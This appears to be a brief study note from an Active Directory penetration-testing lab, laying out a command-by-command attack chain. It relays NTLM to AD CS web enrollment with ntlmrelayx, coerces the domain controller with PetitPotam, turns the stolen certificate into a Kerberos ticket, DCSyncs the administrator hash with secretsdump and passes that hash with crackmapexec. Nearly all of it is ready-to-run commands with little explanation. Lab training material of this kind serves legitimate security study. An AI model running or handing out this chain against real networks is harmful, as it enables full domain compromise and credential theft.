
Point the target to the location of the CA, Use certi to attempt to locate the CA

use either KerberosAuthentication or DomainController AD CS template

```
sudo ntlmrelayx.py -debuf -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

in another window we run petitpotam.py
```
python3 PetitPotam.py CAIP ATTACKHOSTIP
```
Should catch the Base64 encoded certificate for DC01

Request a TGT using gettgtpkinit.py
```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 base64encodedcertificate= dc01.ccache
```

the TGT requested above was saved down to the dc01.ccache file
```
export KRB5CCNAME=dc01.ccache
```

Using Domain Controller TGT to DCSync
```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

snag the administrator hash the crackmapexec
```
crackmapexec smb 172.16.5.5 -u administrator -H HASH
```

